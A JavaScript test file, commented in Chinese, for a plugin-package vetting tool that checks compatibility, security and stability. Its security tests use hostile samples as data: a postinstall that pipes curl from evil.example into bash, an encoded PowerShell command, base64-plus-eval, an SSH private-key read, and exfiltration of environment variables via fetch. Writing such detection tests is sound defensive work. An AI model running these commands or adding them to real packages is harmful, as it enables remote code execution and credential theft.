// 安全性 + 稳定性规则自检（纯函数，无需真装包）
import { checkCandidate, summarize } from '../lib/rules.js';
import { scanInstallScripts, scanSourceText, findLookalikes } from '../lib/security.js';

let failures = 0;
const ok = (label, condition, extra) => {
  if (condition) console.log(`  ok   ${label}`);
  else {
    failures += 1;
    console.log(`  FAIL ${label}${extra ? ' -> ' + JSON.stringify(extra) : ''}`);
  }
};

const baseEnv = {
  dshVersion: '0.2.1-rc.3',
  nodeVersion: '24.21.0',
  availableClientPackages: ['@deepseek-ai/dsh-client-ui-layout'],
  installedVersions: { '@deepseek-ai/cordis': '4.0.5' },
  profileBundles: [],
  bundleSoftLimit: 40,
  knownBad: [],
  maliciousPackages: ['evil-pkg', '@badscope'],
  installedNames: ['dshmarket', 'dsh-armory', 'dsh-chat-import'],
};

const baseManifest = {
  name: 'dsh-topic',
  version: '1.0.0',
  license: 'MIT',
  repository: { url: 'https://github.com/x/y' },
  author: { name: 'x' },
  engines: { dsh: '>=0.2.0', node: '>=22' },
  main: 'lib/index.js',
  exports: { '.': './lib/index.js', './client': './lib/client.js', './package.json': './package.json' },
  dsh: { bundle: { patch: './cordis.patch.yml' }, client: { platform: 'web', inject: ['@deepseek-ai/dsh-client-ui-layout'] } },
  peerDependencies: { '@deepseek-ai/cordis': '^4.0.0' },
};

const levelOf = (report, id) => report.checks.find((c) => c.id === id)?.level;
const categoryOf = (report, id) => report.checks.find((c) => c.id === id)?.category;

console.log('\n[A] 分类归属');
{
  const report = checkCandidate({ spec: 'dsh-topic@1.0.0', manifest: baseManifest, env: baseEnv });
  ok('runtime-version 属于兼容性', categoryOf(report, 'runtime-version') === 'compatibility');
  ok('sec-scripts 属于安全性', categoryOf(report, 'sec-scripts') === 'security');
  ok('st-entrypoints 属于稳定性', categoryOf(report, 'st-entrypoints') === 'stability');
  const stats = summarize(report.checks).byCategory;
  ok('三类都有统计', Boolean(stats.compatibility && stats.security && stats.stability), stats);
  ok('总和等于检查条数', stats.compatibility.total + stats.security.total + stats.stability.total === report.checks.length);
  ok('干净包整体 ok', report.ok === true, report.blocked);
}

console.log('\n[B] 安全性：安装脚本下载即执行');
{
  const bad = {
    ...baseManifest,
    scripts: { postinstall: 'curl -fsSL https://evil.example/x.sh | bash' },
  };
  ok('scanInstallScripts 命中', scanInstallScripts(bad).length === 1, scanInstallScripts(bad));
  const report = checkCandidate({ spec: 'dsh-topic@1.0.0', manifest: bad, env: baseEnv });
  ok('sec-scripts 阻止安装', levelOf(report, 'sec-scripts') === 'block');
  ok('整体 ok=false', report.ok === false);
}

console.log('\n[C] 安全性：PowerShell 编码命令');
{
  const bad = { ...baseManifest, scripts: { preinstall: 'powershell -NoProfile -EncodedCommand SQBFAFgA' } };
  const report = checkCandidate({ spec: 'x@1.0.0', manifest: bad, env: baseEnv });
  ok('命中编码执行', levelOf(report, 'sec-scripts') === 'block');
}

console.log('\n[D] 安全性：恶意依赖名单（含反向插桩）');
{
  const bad = { ...baseManifest, dependencies: { 'evil-pkg': '1.0.0' } };
  const report = checkCandidate({ spec: 'x@1.0.0', manifest: bad, env: baseEnv });
  ok('依赖命中名单 → 阻止', levelOf(report, 'sec-deps') === 'block');

  // 插桩：把名单清空，同一 manifest 必须转为 pass
  const clean = checkCandidate({ spec: 'x@1.0.0', manifest: bad, env: { ...baseEnv, maliciousPackages: [] } });
  ok('名单清空后 sec-deps=pass', levelOf(clean, 'sec-deps') === 'pass', levelOf(clean, 'sec-deps'));
}

console.log('\n[E] 安全性：源码特征');
{
  const obfuscated = 'const payload = eval(Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString())';
  const hits = scanSourceText(obfuscated, 'lib/a.js');
  ok('base64+eval 命中', hits.some((h) => h.id === 'mal-eval-b64'), hits);

  const ssh = 'const k = fs.readFileSync(path.join(os.homedir(), ".ssh", "id_rsa"))';
  ok('SSH 私钥读取命中', scanSourceText(ssh, 'lib/b.js').some((h) => h.id === 'priv-ssh'));

  const exfil = 'fetch("http://x", { body: JSON.stringify(process.env) })';
  ok('环境变量外传命中', scanSourceText(exfil, 'lib/c.js').some((h) => h.id === 'priv-env-exfil'));

  const report = checkCandidate({
    spec: 'x@1.0.0',
    manifest: baseManifest,
    env: baseEnv,
    sourceHits: hits,
  });
  ok('源码命中 → sec-source 阻止', levelOf(report, 'sec-source') === 'block');

  const clean = checkCandidate({ spec: 'x@1.0.0', manifest: baseManifest, env: baseEnv, sourceHits: [] });
  ok('无命中 → sec-source 通过', levelOf(clean, 'sec-source') === 'pass');
}

console.log('\n[F] 安全性：包名仿冒');
{
  ok('dshmarke（少一个 t）与 dshmarket 距离 1', findLookalikes('dshmarke', ['dshmarket']).length === 1);
  ok('完全无关的包不误报', findLookalikes('dsh-univer-office', ['dshmarket', 'dsh-armory']).length === 0);
  const report = checkCandidate({ spec: 'dshmarke@1.0.0', manifest: { ...baseManifest, name: 'dshmarke' }, env: baseEnv });
  ok('sec-typosquat 提醒', levelOf(report, 'sec-typosquat') === 'warn');
}

console.log('\n[G] 稳定性：入口声明缺失（致命）');
{
  const bad = { ...baseManifest, exports: { '.': './lib/index.js' } };
  const report = checkCandidate({ spec: 'x@1.0.0', manifest: bad, env: baseEnv });
  ok('st-entrypoints 阻止', levelOf(report, 'st-entrypoints') === 'block', levelOf(report, 'st-entrypoints'));

  const fixed = checkCandidate({ spec: 'x@1.0.0', manifest: baseManifest, env: baseEnv });
  ok('补齐 exports 后通过', levelOf(fixed, 'st-entrypoints') === 'pass');
}

console.log('\n[H] 稳定性：版本/依赖/维护信号');
{
  const pre = checkCandidate({ spec: 'x@1.0.0', manifest: { ...baseManifest, version: '0.0.3-beta.1' }, env: baseEnv });
  ok('预发布/0.0.x 提醒', levelOf(pre, 'st-version') === 'warn');

  const deps = {};
  for (let i = 0; i < 70; i += 1) deps[`dep-${i}`] = '1.0.0';
  const heavy = checkCandidate({ spec: 'x@1.0.0', manifest: { ...baseManifest, dependencies: deps }, env: baseEnv });
  ok('依赖过多提醒', levelOf(heavy, 'st-deps-weight') === 'warn');

  const bare = { ...baseManifest, license: undefined, repository: undefined };
  const noInfo = checkCandidate({ spec: 'x@1.0.0', manifest: bare, env: baseEnv });
  ok('缺 license/repository 提醒', levelOf(noInfo, 'st-maintenance') === 'warn');

  const noEngine = { ...baseManifest, engines: { dsh: '>=0.2.0' } };
  const engine = checkCandidate({ spec: 'x@1.0.0', manifest: noEngine, env: baseEnv });
  ok('缺 engines.node 提醒', levelOf(engine, 'st-engine-declared') === 'warn');
}

console.log('\n[I] 稳定性：包体积');
{
  const big = { ...baseManifest, dist: { unpackedSize: 80 * 1024 * 1024 } };
  const report = checkCandidate({ spec: 'x@1.0.0', manifest: big, env: baseEnv });
  ok('超大包提醒', levelOf(report, 'st-package-size') === 'warn');
}

console.log('\n==============================');
console.log(failures === 0 ? 'ALL PASS' : `${failures} FAILURES`);
process.exit(failures === 0 ? 0 : 1);
